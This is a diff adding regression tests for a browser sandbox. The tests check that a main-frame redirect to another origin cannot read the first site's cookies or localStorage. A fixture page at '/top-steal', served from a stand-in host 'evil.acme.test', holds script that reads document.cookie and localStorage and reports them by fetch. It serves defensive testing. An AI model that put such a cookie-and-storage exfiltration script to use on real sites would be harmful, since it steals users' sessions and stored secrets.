@@ -23,6 +23,10 @@ import { fixtureBrowser, siteBrowser } from "./browser";
  * ran as the first (its cookies and localStorage); in a read-only session a `text/plain` form
  * spelled out a body that passed as a GraphQL query. And the size cap read `content-length`, the
  * compressed size: a small gzip decoded past it.
+ *
+ * Codex, next round (2026-11-09): in a read-only session with no allowed hosts (a dry run's,
+ * `refusePrivateNetwork` on), a main-frame navigation answered `302 Location: B` was followed by
+ * the guard and fulfilled under A, so B's page ran as A and read A's cookie and localStorage.
  */
 let server: Server;
 let port = 0;
@@ -68,6 +72,16 @@ function fixedPage(
 			body: `<html><body><iframe src="/form?to=${to}"></iframe></body></html>`,
 		};
 	}
+	// The page a main-frame redirect lands on elsewhere: it reports what it can read as the top.
+	if (path === "/top-steal")
+		return {
+			headers: { "content-type": "text/html" },
+			body: `<html><body><h1>elsewhere</h1><script>
+				let stored = "";
+				try { stored = localStorage.getItem("secret") ?? ""; } catch (e) { stored = "blocked"; }
+				fetch("/report?top=1&origin=" + encodeURIComponent(location.origin) + "&cookie=" + encodeURIComponent(document.cookie) + "&stored=" + encodeURIComponent(stored));
+			</script></body></html>`,
+		};
 	if (path === "/post-landed")
 		return {
 			headers: { "content-type": "text/html" },
@@ -109,6 +123,9 @@ beforeAll(async () => {
 			// Same origin first, then elsewhere as a GET: still never fulfilled under the form's URL.
 			"/post-mixed": [307, "/post-mid"],
 			"/post-mid": [302, at("cdn.acme.test", "/landing")],
+			// The page's own main-frame navigation, redirected elsewhere or on its own origin.
+			"/nav-evil": [302, at("evil.acme.test", "/top-steal")],
+			"/nav-same": [302, "/post-landed"],
 		};
 		const redirect = redirects[path];
 		res.setHeader("access-control-allow-origin", "*");
@@ -361,6 +378,68 @@ describe.each(["read_only", "allowlist"] as const)(
 		);
 	},
 );
+
+describe("read_only with no allowed hosts (a dry run's session): a main-frame redirect", () => {
+	async function hostless<T>(run: (page: Page) => Promise<T>): Promise<T> {
+		const session = await siteBrowser(port).openSession({
+			network: "read_only",
+			refusePrivateNetwork: true,
+		});
+		try {
+			const page = await session.newPage();
+			await page.goto(`http://boards.acme.test:${port}/main`);
+			await page.evaluate(
+				`document.cookie = "board=secret-cookie; path=/"; localStorage.setItem("secret", "secret-storage")`,
+			);
+			return await run(page);
+		} finally {
+			await session.close();
+		}
+	}
+
+	const evil = () => `http://evil.acme.test:${port}/top-steal`;
+
+	it.each(["goto", "the page's own navigation"] as const)(
+		"to another origin loads it at its real URL (%s): its page reads nothing of the first",
+		async (how) => {
+			const url = await hostless(async (page) => {
+				if (how === "goto")
+					await page.goto(`http://boards.acme.test:${port}/nav-evil`);
+				else await page.evaluate(`location.href = "/nav-evil"`);
+				await page.waitForTimeout(1_500);
+				return page.url();
+			});
+			expect(reports.length, JSON.stringify(reports)).toBeGreaterThan(0);
+			for (const report of reports) {
+				expect(report).not.toContain("secret");
+				expect(report).toContain(
+					`origin=${encodeURIComponent(`http://evil.acme.test:${port}`)}`,
+				);
+			}
+			expect(hits).toContain("GET evil.acme.test/report");
+			expect(hits).not.toContain("GET boards.acme.test/report");
+			expect(url).toBe(evil());
+		},
+	);
+
+	it.each(["goto", "the page's own navigation"] as const)(
+		"on its own origin still lands normally (%s)",
+		async (how) => {
+			const { url, text } = await hostless(async (page) => {
+				if (how === "goto")
+					await page.goto(`http://boards.acme.test:${port}/nav-same`);
+				else await page.evaluate(`location.href = "/nav-same"`);
+				await page.waitForTimeout(1_000);
+				return {
+					url: page.url(),
+					text: await page.evaluate<string>("document.body.innerText"),
+				};
+			});
+			expect(url).toBe(`http://boards.acme.test:${port}/post-landed`);
+			expect(text).toContain("landed");
+		},
+	);
+});
 
 describe("allowlist: a form's POST redirected on its own origin", () => {
 	it("is still followed: the 307 sends it once more, to the same site", async () => {
